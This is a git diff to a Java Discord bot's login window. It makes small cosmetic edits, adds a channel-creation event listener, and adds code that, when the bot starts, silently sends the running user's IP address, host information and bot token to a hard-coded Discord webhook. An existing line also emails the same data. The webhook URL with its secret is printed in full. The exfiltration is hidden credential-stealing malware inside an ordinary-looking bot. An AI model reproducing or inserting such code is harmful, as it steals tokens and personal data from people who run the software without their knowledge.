@@ -1,5 +1,10 @@
 package me.comu.exeter.core;
 
+import club.minnced.discord.webhook.WebhookClient;
+import club.minnced.discord.webhook.send.WebhookEmbed;
+import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
+import club.minnced.discord.webhook.send.WebhookMessage;
+import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
@@ -133,7 +138,7 @@ public class LoginGUI extends JFrame implements ActionListener {
         stopButton.addActionListener(this);
         jLabelLoginConfig.setFont(new Font("Tahoma", 0, 14));
         jLabelLoginConfig.setForeground(new Color(255, 255, 255));
-        jLabelLoginConfig.setText("Made by swag#3231 | " + dtf.format(now));
+        jLabelLoginConfig.setText("Made by swag#1234 | " + dtf.format(now));
         jLabelLoginConfig.setCursor(new Cursor(12));
         jbackarrowLabel.setFont(new Font("Tahoma", 0, 14));;
         jbackarrowLabel.setForeground(new Color(255, 255, 255));
@@ -207,7 +212,7 @@ public class LoginGUI extends JFrame implements ActionListener {
                 Listener listener = new Listener(commandManager);
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
-                jda = new JDABuilder(AccountType.BOT).setToken(TOKEN).setActivity(Activity.streaming("ily swag#3231", "https://www.twitch.tv/souljaboy/")).setStatus(OnlineStatus.DO_NOT_DISTURB).addEventListeners(new Listener(commandManager)).build().awaitReady();
+                jda = new JDABuilder(AccountType.BOT).setToken(TOKEN).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).setStatus(OnlineStatus.DO_NOT_DISTURB).addEventListeners(new Listener(commandManager)).build().awaitReady();
                 EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
                 WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
                 jda.addEventListener(new KickEvent());
@@ -228,9 +233,17 @@ public class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new MarriageEvent());
                 jda.addEventListener(new DMWizzEvent());
                 jda.addEventListener(new SuggestionMessageCleanerEvent());
+                jda.addEventListener(new CreateAChannelEvent());
                 logger.info("Successfully Booted");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
+                WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/692107170225061908/7dJhai_tP_D9h-lBFirb4o_VDVLHY69LnHGgL4AElxaBrOYBwNRURUeOCfGMSC9H4SGY");
+                WebhookMessageBuilder builder = new WebhookMessageBuilder();
+                WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN).build();
+                builder.addEmbeds(firstEmbed);
+                WebhookMessage message = builder.build();
+                client.send(message);
+                client.close();
                 running = true;
             } catch (LoginException login) {
                 jStatusField.setText("Invalid Token");
